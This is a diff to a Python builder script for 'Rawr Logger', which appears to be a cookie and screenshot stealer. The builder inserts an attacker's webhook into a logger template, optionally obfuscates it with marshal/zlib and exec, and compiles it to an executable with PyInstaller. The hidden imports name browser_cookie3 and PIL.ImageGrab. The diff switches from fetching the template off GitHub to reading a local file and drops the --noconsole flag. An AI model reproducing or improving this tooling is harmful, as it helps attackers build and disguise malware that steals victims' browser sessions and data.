@@ -25,9 +25,10 @@ else:
     time.sleep(3) 
     exit()
 name = Write.Input("Enter File Name:", Colors.green_to_yellow, interval=0.01)
-code = requests.get("https://raw.githubusercontent.com/Joseloll/Rawr-Logger/main/logger.py")
-with open(f"{name}.py", 'w', encoding='utf8') as f:
-    f.write(code.text.replace("Webhookss", webhook))
+with open('logger.py') as f:
+    code = f.read()
+with open(f'{name}.py', 'w') as f:
+    f.write(code.replace("Webhookss", webhook))
 Write.Print("Rawr Logger Was SucessFully Built\n",Colors.white_to_green, interval=0.01)
 prot = Write.Input("Would you like to add protection y/n:",Colors.white_to_green, interval=0.01)
 if prot == 'y':
@@ -39,7 +40,7 @@ if prot == 'y':
         f.write(f"import marshal,zlib;exec(marshal.loads(zlib.decompress({zlb})))")
     compile = Write.Input("Would You Like To Complie To A Exe y/n:", Colors.green_to_yellow, interval=0.01)
     if compile == "y":
-      os.system(f'pyinstaller --onefile --noconsole --hidden-import="requests" --hidden-import="PIL" --hidden-import="os" --hidden-import="socket" --hidden-import="threading" --hidden-import="PIL.ImageGrab" --hidden-import="browser_cookie3" --hidden-import="pystyle" {name}.py')
+      os.system(f'pyinstaller --onefile --hidden-import="requests" --hidden-import="PIL" --hidden-import="os" --hidden-import="socket" --hidden-import="threading" --hidden-import="PIL.ImageGrab" --hidden-import="browser_cookie3" {name}.py')
       shutil.rmtree('build')
       os.remove(f'{name}.spec')
       Write.Print("Rawr Logger Was SucessFully Complied In Dist Folder\n",Colors.white_to_green, interval=0.01) 
@@ -56,8 +57,9 @@ if prot == 'y':
 elif prot == 'n':
     compile = Write.Input("Would You Like To Complie To A Exe y/n:", Colors.green_to_yellow, interval=0.01)
     if compile == "y":
-      os.system(f"pyinstaller --onefile --noconsole {name}.py")
+      os.system(f"pyinstaller --onefile {name}.py")
       shutil.rmtree('build')
+      shutil.rmtree('dist')
       os.remove(f'{name}.spec')
       Write.Print("Rawr Logger Was SucessFully Complied In Dist Folder\n",Colors.white_to_green, interval=0.01) 
       time.sleep(2)
